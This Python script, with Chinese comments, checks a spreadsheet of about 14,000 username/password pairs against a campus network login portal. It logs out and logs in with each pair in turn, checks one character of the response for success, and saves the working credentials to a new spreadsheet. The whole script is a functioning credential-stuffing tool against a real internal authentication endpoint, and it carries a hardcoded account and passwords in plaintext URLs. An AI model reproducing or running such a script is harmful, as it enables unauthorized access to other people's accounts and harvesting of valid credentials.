import xlrd
import requests
import json
from xlrd.sheet import Colinfo
import xlwt
import time





# 打开刚才我们写入的 test_w.xls 文件
wb = xlrd.open_workbook("./xinxi.xls")
# 获取并打印 sheet 数量
print( "sheet 数量:", wb.nsheets)
# # 获取并打印 sheet 名称
# print( "sheet 名称:", wb.sheet_names())
# 根据 sheet 索引获取内容
sh1 = wb.sheet_by_index(0)
print(sh1)
# 也可根据 sheet 名称获取内容
# sh = wb.sheet_by_name('成绩')
# 获取并打印该 sheet 行数和列数
print( u"sheet %s 共 %d 行 %d 列" % (sh1.name, sh1.nrows, sh1.ncols))
# 获取并打印某个单元格的值
# print( "第一行第一列的值为:", sh1.cell_value(0, 0))
a = 0
write_hang = 0
namelist = []
codelist = []
while(a < 14408):
    print('开始检测')
    # print("第 %d 个" % (a), sh1.cell_value(a, 0), sh1.cell_value(a, 1))
    name = sh1.cell_value(a, 0)
    code = sh1.cell_value(a, 1)
    url_logoff = 'http://10.200.84.3:801/eportal/?c=Portal&a=logout&callback=dr1004&login_method=1&user_account=drcom&user_password=123&ac_logout=1&register_mode=1&wlan_user_ip=10.190.86.212&wlan_user_ipv6=&wlan_vlan_id=1&wlan_user_mac=7c8ae11bd497&wlan_ac_ip=&wlan_ac_name=&jsVersion=3.3.2&v=9688'
    login = 'http://10.200.84.3:801/eportal/?c=Portal&a=login&callback=dr1003&login_method=1&user_account={}&user_password={}&wlan_user_ip=10.190.86.212&wlan_user_ipv6=&wlan_user_mac=000000000000&wlan_ac_ip=&wlan_ac_name=&jsVersion=3.3.2&v=8972'.format(name, code)
    requests.post(url_logoff)
    value = requests.post(login)
    # print(value.text)
    # print(str(value.text)[18:19])
    if str(value.text)[18:19] == '1':
        print(login)
        print('账号：{} 密码：{}'.format(name, code))
        
        # write_wb = xlwt.Workbook()
        # write_wb = xlwt.Workbook()
        # write_sh1.write(write_hang, 0, '{}'.format(name))
        # write_sh1.write(write_hang, 1, '{}'.format(code))
        # write_wb.save('./data.xls')
        # write_hang = write_hang + 1
        # print(write_hang)
        print('当前运算到 {} 行'.format(a))
        namelist.append(name)
        codelist.append(code)
        print(namelist)
        print(codelist)
        row = 0
        book = xlwt.Workbook()
        sheet = book.add_sheet('miyao')
        for name in namelist:
            sheet.write(row, 0, name)
            row = row + 1
        print('账号已写入')
        row = 0
        for code in codelist:
            sheet.write(row, 1, code)
            row = row + 1
        print('密码已写入')
        book.save('./data.xls')
        print('开始继续进行检测')
    a = a + 1
    
# 获取整行或整列的值
# rows = sh1.row_values(0) # 获取第一行内容
# cols = sh1.col_values(1) # 获取第二列内容
# # 打印获取的行列值
# print( "第一行的值为:", rows)
# print( "第二列的值为:", cols)
# # 获取单元格内容的数据类型
# print( "第二行第一列的值类型为:", sh1.cell(1, 0).ctype)